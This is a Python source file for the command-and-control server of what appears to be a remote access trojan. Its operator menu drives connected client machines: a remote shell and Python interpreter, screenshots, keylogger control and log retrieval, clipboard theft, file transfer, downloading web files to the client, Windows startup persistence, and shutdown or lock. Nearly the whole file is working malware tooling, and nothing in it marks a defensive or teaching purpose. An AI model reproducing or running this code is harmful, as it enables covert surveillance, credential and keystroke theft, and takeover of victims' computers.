import json
import logging
import os
import platform
import socket
import sys
import threading
import time
import traceback
from datetime import datetime

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

def is_windows() -> bool:
    """ Returns if Server is running on windows """
    return platform.system() == 'Windows'

if not is_windows():
    # readline allows movement with arrowkeys on linux
    try:
        import readline
    except ImportError:
        pass

logging.basicConfig(level=logging.CRITICAL)

interface_help = """--h | See this Help Message
--e | Open a shell
--i | Open Remote Python Interpreter
--g | Grabs a screenshot
--u | User Info
--k (start) (stop) (status) | Manage Keylogger
--l | Returns log from client (includes keylogs)
--s | Transfers file to Client
--r | Transfers file to Server
--d | Download file from the web
--c | Copies to Client Clipboard
--p | Returns Client Current Clipboard
--t 1 | Add to Startup (Windows)
--t 2 | Remove from Startup (Windows)
--q 1 | Lock Client Machine (Windows)
--q 2 | Shutdown Client Machine
--q 3 | Restart Client Machine
--x 1 | Restart Client Session
--x 2 | Disconnect Client
--b | Run Connection in Background (or CTRL-C)"""

turtle_help = """--h | See this Help Message
--l | List connected Clients
--i (ID) | Connect to a Client
--a | Broadcast command to all connected clients
--s | Shutdown Server"""


def read_file(path, block_size=1024) -> bytes:
    """ Generator for reading files """
    with open(path, 'rb') as f:
        while True:
            piece = f.read(block_size)
            if piece:
                yield piece
            else:
                return


def Hasher(MESSAGE) -> bytes:
    """ Hashes data """
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()


def verifySignature(publicKey, signature, message) -> bool:
    """ Verify signature with public key """
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
    except:
        return False
    return True


def sign(privateKey, data) -> bytes:
    """ Sign data with private key """
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature


def encrypt(publicKey, plaintext) -> bytes:
    """ Encrypt using public key """
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext


def decrypt(privateKey, ciphertext) -> bytes:
    """ Decrypt using private key """
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext


def public_bytes(publicKey) -> bytes:
    """ Get Public Key in Bytes """
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic


def errors(ERROR, line=True) -> str:
    """ Error Handler """
    error_class = ERROR.__class__.__name__
    error_msg = '%s' % error_class
    try:
        error_msg += ': {0}'.format(ERROR.args[0])
    except:
        error_msg += ':'
    if line:
        try:
            _, _, tb = sys.exc_info()
            line_number = traceback.extract_tb(tb)[-1][1]
            error_msg += ' (line {0})'.format(line_number)
        except:
            pass
    return error_msg

def shell_print(data) -> None:
    """ Support for printing more characters """
    # Mostly for tree command in Windows
    try:
        print(data.decode())
    except UnicodeDecodeError:
        try:
            print(data.decode('cp437'))
        except UnicodeDecodeError:
            print(data)
    return


def json_dumps(data) -> bytes:
    """ Dump json data and encode it """
    return json.dumps(data).encode()


def json_loads(data):
    """ Decode data and json load it """
    return json.loads(data.decode())


class MultiServer(object):

    def __init__(self, host='', port=9999) -> None:
        self.host = host
        self.port = port
        self.socket = None
        self.all_keys = []
        self.all_connections = []
        self.all_addresses = []

    def __repr__(self):
        return 'MultiServer(host="{}", port={})'.format(self.host, self.port)

    def socket_create(self) -> None:
        """ Create Socket """
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            logging.error("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self) -> None:
        """ Bind socket to port and wait for connection from client """
        # returns None
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            logging.error("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def recvall(self, conn, n) -> bytes:
        """ Function to receive n amount of bytes"""
        # returns bytes/None
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def get_key(self, conn) -> Fernet:
        """ Get Encryption Key from conn """
        # returns Fernet Key
        target = self.all_connections.index(conn)
        return self.all_keys[target]

    def receive(self, conn, _print=False) -> bytes:
        """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
        # returns bytes
        KEY = self.get_key(conn)
        length = int(KEY.decrypt(conn.recv(2048)).decode())
        conn.send(b'RECEIVED')
        received = KEY.decrypt(self.recvall(conn, length))
        if _print:
            print(received.decode())
        return received

    def send(self, conn, data) -> None:
        """ Send Buffer Size and Data to Client Encrypted with Connection Specific AES Key """
        # returns None
        KEY = self.get_key(conn)
        encrypted = KEY.encrypt(data)
        conn.send(KEY.encrypt(str(len(encrypted)).encode()))
        conn.recv(1024)
        conn.send(encrypted)

    def accept_connections(self, _print=False) -> None:
        """ Accepts incoming connections and agrees on a AES key using RSA"""
        while 1:
            try:
                privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
                publicKey = privateKey.public_key()
                conn, address = self.socket.accept()
                conn.setblocking(1)
                clientPublic = serialization.load_pem_public_key(conn.recv(20480), backend=default_backend())
                conn.send(public_bytes(publicKey))

                def recv_data(conn):
                    buffer = int(conn.recv(4096).decode())
                    conn.send(b'RECEIVED')
                    data = self.recvall(conn, buffer)
                    conn.send(b'RECEIVED')
                    return data

                Hashed_Key = recv_data(conn)
                Encrypted = recv_data(conn)
                Hash_Encrypted = recv_data(conn)
                Signature = recv_data(conn)
                Encrypted_Signature = recv_data(conn)

                Encrypted_Verify = verifySignature(clientPublic, Encrypted_Signature, Hash_Encrypted)
                logging.debug('Encrypted Hash Signature Verification: {}'.format(str(Encrypted_Verify)))
                if not Encrypted_Verify:

                    logging.error('Error Verifying Hash')
                    continue

                Decrypted = decrypt(privateKey, Encrypted)
                Verify_Decryption = verifySignature(clientPublic, Signature, Hashed_Key)
                logging.debug('Hash Signature Verification: {}'.format(str(Verify_Decryption)))
                if not Verify_Decryption:

                    logging.error('Error Verifying Hash')
                    continue

                Compare = Hasher(Decrypted) == Hashed_Key

                logging.debug('Hash Verification: {}'.format(str(Compare)))
                if not Compare:

                    logging.error('Key and Hashed Key do not match!')
                    continue

                self.all_keys.append(Fernet(Decrypted))
                self.all_connections.append(conn)
                logging.debug('Fernet Key: {}'.format(str(Decrypted)))

                client_hostname = self.receive(conn).decode()

                address = address + (client_hostname,)
                self.all_addresses.append(address)
                if _print:
                    msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
                    print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
            except Exception as e:
                logging.debug(errors(e))
            finally:
                del privateKey
                del publicKey

    def del_conn(self, conn) -> None:
        """ Delete a connection """
        target = self.all_connections.index(conn)
        del self.all_connections[target]
        del self.all_addresses[target]
        del self.all_keys[target]
        conn.close()

    def refresh_connections(self) -> None:
        """ Refreshes connections """
        connections = self.all_connections[:]
        for conn in connections:
            try:
                self.send(conn, json_dumps(['LIST']))
                conn.recv(20480)
            except:
                self.del_conn(conn)

    def list_connections(self) -> None:
        """ List all connections """
        self.refresh_connections()
        print('----- Clients -----')
        for i, address in enumerate(self.all_addresses):
            print('   '.join(map(str, (i, ) + address)))
        return

    def get_target(self, cmd) -> socket.socket:
        """ Select target client """
        # returns socket.socket()
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
            conn = self.all_connections[target]
        except (ValueError, IndexError):
            logging.error('Not a valid selection')
            return None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return conn

    def send_file(self, conn, file_to_transfer, save_as) -> None:
        """ Send file from Server to Client """
        # returns True/False, None/error
        self.send(conn, json_dumps(['SEND_FILE', save_as]))
        if self.receive(conn) == b'FILE_TRANSFER_ERROR':
            self.send(conn, b'RECEIVED')
            return False, self.receive(conn).decode()
        for line in read_file(file_to_transfer):
            self.send(conn, line)
            self.receive(conn)

        self.send(conn, b'FILE_TRANSFER_DONE')
        self.receive(conn)
        return True, None

    def receive_file(self, conn, file_to_transfer, save_as) -> None:
        """ Transfer file from Client to Server """
        # returns True/False, None/error
        self.send(conn, json_dumps(['RECEIVE_FILE', file_to_transfer]))
        with open(save_as, 'wb') as f:
            while 1:
                data = self.receive(conn)
                if data == b'FILE_TRANSFER_ERROR':
                    self.send(conn, b'RECEIVED')
                    return False, self.receive(conn).decode()
                if data == b'FILE_TRANSFER_DONE':
                    self.send(conn, b'RECEIVED')
                    break
                f.write(data)
                self.send(conn, b'RECEIVED')
        self.receive(conn)
        return True, None

    def _get_log(self, conn) -> str:
        """ Get Log File Name"""
        self.send(conn, json_dumps(['LOG_FILE']))
        return self.receive(conn).decode()

    def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))) -> (bool, str):
        """ Take screenshot on Client """
        # returns True/False, None/error
        self.send(conn, json_dumps(['SCREENSHOT']))
        data = self.receive(conn).decode()
        if data == 'ERROR':
            self.send(conn, b'RECEIVING')
            return False, self.receive(conn)
        self.receive_file(conn, data, save_as)
        return True, save_as

    def client_exec(self, conn, command) -> (str, str):
        """ Remote Python Interpreter """
        # returns command_output, error/None
        self.send(conn, json_dumps(['EXEC', command]))
        data = json_loads(self.receive(conn))
        return data[0], data[1]

    def python_interpreter(self, conn) -> None:
        """ Remote Python Interpreter CLI"""
        # returns None
        print('CAUTION! Using this feature wrong can break the client until restarted.')
        print('Tip: help("modules") lists available modules')
        while 1:
            command = input('>> ')
            if command in ['exit', 'exit()']:
                break
            output, error = self.client_exec(conn, command)
            if error == None:
                if output != '':
                    print(output.rstrip("\n"))
            else:
                print(error)

    def client_shell(self, conn, command, _print=True) -> (str, str):
        """ Remote Shell with Client """
        # returns command_output, cwd
        system = self.get_platform(conn)
        if command.lower().strip() == 'cd':
            cwd = self.get_cwd(conn)
            if self.get_platform(conn) == 'Windows':
                cwd += '\n'
            if _print:
                print(cwd)
            return cwd
        split_command = command.split(' ')[0].strip().lower()
        if split_command in ['cd', 'chdir']:
            self.send(conn, json_dumps(['SHELL', command]))
            cwd = json.loads(self.receive(conn).decode())
            if cwd[0] == 'ERROR':
                if _print:
                    print(cwd[1])
                return cwd[1]
            if _print and system == 'Windows':
                print()
            return ''
        if command.lower().strip() == 'cls' and self.get_platform(conn) == 'Windows':
            os.system('cls')
            return ''
        if command[:5].lower().strip() == 'clear' and self.get_platform(conn) != 'Windows':
            os.system('clear')
            return ''
        self.send(conn, json_dumps(['SHELL', command]))
        result = []
        while 1:
            try:
                output = self.receive(conn)
                if output == b'DONE':
                    break
                result.append(output)
                if _print:
                    shell_print(output)
                self.send(conn, json_dumps(['LISTENING']))
            except (EOFError, KeyboardInterrupt):
                self.send(conn, b'QUIT')
        return result

    def is_frozen(self, conn) -> bool:
        """ Check if the client is frozen (exe) """
        # returns bool
        self.send(conn, json_dumps(['FROZEN']))
        return json_loads(self.receive(conn))

    def get_platform(self, conn) -> str:
        """ Get Client Platform """
        # platform.system()
        self.send(conn, json_dumps(['PLATFORM']))
        return self.receive(conn).decode()

    def get_cwd(self, conn) -> str:
        """ Get Client cwd """
        # returns cwd
        self.send(conn, json_dumps(['GETCWD']))
        return self.receive(conn).decode()

    def start_keylogger(self, conn) -> bool:
        """ Start Keylogger """
        # returns True/False
        self.send(conn, json_dumps(['START_KEYLOGGER']))
        return json_loads(self.receive(conn))

    def keylogger_status(self, conn) -> bool:
        """ Get Keylogger Status """
        # returns True/False
        self.send(conn, json_dumps(['KEYLOGGER_STATUS']))
        return json_loads(self.receive(conn))

    def stop_keylogger(self, conn) -> bool:
        """ Stop Keylogger """
        # returns True/False
        self.send(conn, json_dumps(['STOP_KEYLOGGER']))
        return json_loads(self.receive(conn))

    def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))) -> str:
        """ Transfer log to Server """
        # save_as: file name
        log = self._get_log(conn)
        self.receive_file(conn, log, save_as)
        return save_as

    def get_info(self, conn, _print=True) -> str:
        """ Get Client Info """
        # Returns str
        self.send(conn, json_dumps(['INFO']))
        return self.receive(conn, _print=_print).decode()

    def fill_clipboard(self, conn, data) -> (bool, str):
        """ Copy to Client Clipboard"""
        # data[0]: True/False
        # data[1]: None/error
        self.send(conn, json_dumps(['COPY', data]))
        data = json_loads(self.receive(conn))
        return data[0], data[1]

    def get_clipboard(self, conn, _print=False) -> (bool, str):
        """ Get Client Clipboard """
        # data[0]: True/False
        # data[1]: clipboard/error
        self.send(conn, json_dumps(['PASTE']))
        data = json_loads(self.receive(conn))
        if _print and data[0]:
            print(data[1])
        return data[0], data[1]

    def _get_info(self, conn) -> list:
        """ Get Client Info """

        # info = [
        #     platform.system(),
        #     os.path.expanduser('~'),
        #     getpass.getlogin()
        # ]

        self.send(conn, json_dumps(['_INFO']))
        return json_loads(self.receive(conn))

    def download(self, conn, url, file_name) -> (bool, str):
        """ Download File To Client """
        # returns True/False, None/error
        self.send(conn, json_dumps(['DOWNLOAD', url, file_name]))
        data = json_loads(self.receive(conn))
        return data[0], data[1]

    def restart_session(self, conn) -> bool:
        """ Restart Client Session """
        # returns True
        self.send(conn, json_dumps(['RESTART_SESSION']))
        self.receive(conn)
        self.refresh_connections()
        return True

    def disconnect(self, conn) -> bool:
        """ Disconnect Client """
        # returns True
        self.send(conn, json_dumps(['DISCONNECT']))
        self.receive(conn)
        conn.close()
        self.refresh_connections()
        return True

    def add_startup(self, conn) -> (bool, str):
        """ Add Client to Startup """
        # returns True/False, None/error
        self.send(conn, json_dumps(['ADD_STARTUP']))
        return tuple(json_loads(self.receive(conn)))

    def remove_startup(self, conn) -> (bool, str):
        """ Remove Client from Startup """
        # returns True/False, None/error
        self.send(conn, json_dumps(['REMOVE_STARTUP']))
        return tuple(json_loads(self.receive(conn)))

    def lock(self, conn) -> bool:
        """ Lock Client Machine (Windows Only) """
        # Returns bool
        self.send(conn, json_dumps(['LOCK']))
        return json_loads(self.receive(conn))

    def shutdown(self, conn) -> None:
        """ Shutdown Client Machine """
        # returns None
        self.send(conn, json_dumps(['SHUTDOWN']))
        self.refresh_connections()
        return

    def restart(self, conn) -> None:
        """ Restart Client Machine """
        # returns None
        self.send(conn, json_dumps(['RESTART']))
        self.refresh_connections()
        return

    def shell(self, conn) -> None:
        """ Remote Shell Interface """
        # returns None
        command = ''
        info = self._get_info(conn)
        hostname = self.all_addresses[self.all_connections.index(conn)][-1]

        while 1:
            cwd = self.get_cwd(conn)
            if not info[0] == 'Windows':
                cwd = cwd.replace(info[1], '~')
                _input = '{0}@{1}:{2} $ '.format(info[2], hostname, cwd)
            else:
                _input = '{0}>'.format(cwd)

            command = input(_input)
            if command.strip() == '':
                continue
            if command == 'exit':
                break
            self.client_shell(conn, command)

    def selector(self, conn, command) -> bool:
        """ Command selector interface """
        # returns True/None
        if '--h' in command:
            print(interface_help)
            return
        if '--e' in command:
            try:
                self.shell(conn)
            except (EOFError, KeyboardInterrupt):
                print()
            return
        if '--i' in command:
            try:
                self.python_interpreter(conn)
            except (EOFError, KeyboardInterrupt):
                print()
            return
        if '--g' in command:
            print('Taking Screenshot...')
            result, error = self.screenshot(conn)
            if result:
                print('Saved Screenshot.')
            else:
                print('Error Taking Screenshot: {}'.format(error.decode()))
            return
        if '--u' in command:
            self.get_info(conn)
            return
        if command[:3] == '--k':
            if command[4:].strip() == 'start':
                if self.start_keylogger(conn):
                    print('Started Keylogger')
                else:
                    print('Keylogger ImportError')
                return
            if command[4:].strip() == 'status':
                if self.start_keylogger(conn):
                    print('Keylogger Running')
                else:
                    print('Keylogger is not running.')
                return
            if command[4:].strip() == 'stop':
                if self.stop_keylogger(conn):
                    print('Stopped Keylogger')
                else:
                    print('Keylogger ImportError')
                return
        if '--l' in command:
            print('Transferring log...')
            log = self.get_log(conn)
            print('Log saved as: {}'.format(log))
            return
        if '--s' in command:
            file_to_transfer = input('File to Transfer to Client: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            result, error = self.send_file(conn, file_to_transfer, save_as)
            if result:
                print('File transferred.')
            else:
                print('Error transferring file: {}'.format(error))
            return
        if '--r' in command:
            file_to_transfer = input('File to Transfer to Server: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            result, error = self.receive_file(conn, file_to_transfer, save_as)
            if result:
                print('File transferred.')
            else:
                print('Error transferring file: {}'.format(error))
            return
        if '--d' in command:
            file_url = input('File URL: ')
            file_name = input('Filename: ')
            print('Downloading File...')
            result, error = self.download(conn, file_url, file_name)
            if result:
                print('Downloaded file successfully')
            else:
                print(error)
            return
        if '--c' in command:
            text_to_copy = input('Text to copy: ')
            result, error = self.fill_clipboard(conn, text_to_copy)
            if result:
                print('Copied to Clipboard.')
            else:
                print(error)
            return
        if '--p' in command:
            self.get_clipboard(conn, _print=True)
            return
        if command [:3] == '--t':
            select = command[4:].strip()
            if select == '1':
                result, error = self.add_startup(conn)
                if result:
                    print('Client added to Startup')
                else:
                    print(error)
                return
            if select == '2':
                result, error = self.remove_startup(conn)
                if result:
                    print('Removed Client from Startup')
                else:
                    print(error)
                return
        if command[:3] == '--q':
            select = command[4:].strip()
            if select == '1':
                if self.lock(conn):
                    print('Locked Client Machine')
                else:
                    print('Locking is only available on Windows.')
                return
            elif select == '2':
                print('Shutting down Client Machine')
                self.shutdown(conn)
                return True
            elif select == '3':
                print('Restarting Client Machine')
                self.restart(conn)
                return True
        if command[:3] == '--x':
            command = command[4:].strip()
            if command == '1':
                print('Restarting Session...')
                return self.restart_session(conn)
            elif command == '2':
                print('Disconnecting Client...')
                return self.disconnect(conn)
        if '--b' in command:
            return True
        print("Invalid command: '--h' for help.")

    def broadcast(self, command) -> None:
        """ Broadcast a command to all connected Clients """
        # returns None
        connections = self.all_connections[:]
        addresses = self.all_addresses[:]
        for conn in connections:
            try:
                print('Response from {0}:'.format(addresses[connections.index(conn)][0]))
                self.selector(conn, command)
            except Exception as e:
                print(errors(e))

    def interface(self, conn) -> None:
        """ CLI Interface to Client """
        # returns None
        ip = self.all_addresses[self.all_connections.index(conn)][0]
        while True:
            command = input('{0}> '.format(ip))
            if self.selector(conn, command):
                break

    def turtle(self) -> None:
        """ Connection Selector """
        # returns None
        print("Type '--h' for help")
        while True:
            try:
                command = input('> ')
                if command == '--h':
                    print(turtle_help)
                elif command[:3] == '--a':
                    self.broadcast(input('Command to broadcast: '))
                elif command == '--l':
                    self.list_connections()
                elif '--i' in command:
                    conn = self.get_target(command)
                    if conn:
                        try:
                            self.interface(conn)
                        except (EOFError, KeyboardInterrupt):
                            print()
                        except Exception as e:
                            print('Connection lost: {}'.format(errors(e)))
                            self.del_conn(conn)
                    else:
                        print('Invalid Selection.')
                elif command == '--s':
                    raise EOFError
                else:
                    print("Invalid command: '--h' for help.")
            except (EOFError, KeyboardInterrupt):
                print('\nShutting down Server...')
                time.sleep(2)
                break
            except Exception as e:
                print(errors(e))


def accept_conns(server) -> None:
    """ Function to accept connections """
    # Returns None
    server.socket_create()
    server.socket_bind()
    server.accept_connections(_print=True)
    return


def accept_thread(server) -> None:
    """ Runs function to accept connections in thread """
    # Returns None
    t = threading.Thread(target=accept_conns, args=(server,))
    t.daemon = True
    t.start()
    return


if __name__ == '__main__':
    server = MultiServer()
    accept_thread(server)
    server.turtle()
